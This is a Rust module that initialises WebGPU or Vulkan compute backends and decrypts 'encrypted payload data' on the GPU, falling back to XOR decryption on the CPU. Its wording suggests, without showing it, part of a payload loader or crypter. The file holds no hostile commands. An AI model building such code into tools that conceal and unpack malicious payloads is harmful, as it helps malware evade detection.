//! GPU compute shader abstraction.
//!
//! Provides a unified interface for GPU-accelerated payload execution
//! using WebGPU (wgpu) with Vulkan fallback.

pub mod webgpu;
pub mod vulkan;

use anyhow::Result;
use tracing::{info, warn};

/// Initialize GPU compute pipeline
pub fn init() -> Result<()> {
    #[cfg(feature = "gpu-webgpu")]
    {
        match webgpu::init() {
            Ok(_) => {
                info!("WebGPU initialized successfully");
                return Ok(());
            }
            Err(e) => {
                warn!("WebGPU init failed: {}", e);
            }
        }
    }

    #[cfg(feature = "vulkan")]
    {
        match vulkan::init() {
            Ok(_) => {
                info!("Vulkan initialized successfully");
                return Ok(());
            }
            Err(e) => {
                warn!("Vulkan init failed: {}", e);
            }
        }
    }

    Err(anyhow::anyhow!("No GPU backend available, falling back to CPU"))
}

/// Execute a compute shader on encrypted payload data
pub fn execute_compute_shader(payload: &[u8], key: &str) -> Result<Vec<u8>> {
    // Try GPU first, fall back to CPU
    #[cfg(feature = "gpu-webgpu")]
    {
        if let Ok(result) = webgpu::execute(payload, key) {
            return Ok(result);
        }
    }

    // CPU fallback
    Ok(crate::crypto::xor_decrypt(payload, key))
}

/// Decrypt payload using GPU compute shader
pub fn decrypt_with_gpu(payload: &[u8], key: &str) -> Result<Vec<u8>> {
    execute_compute_shader(payload, key)
}
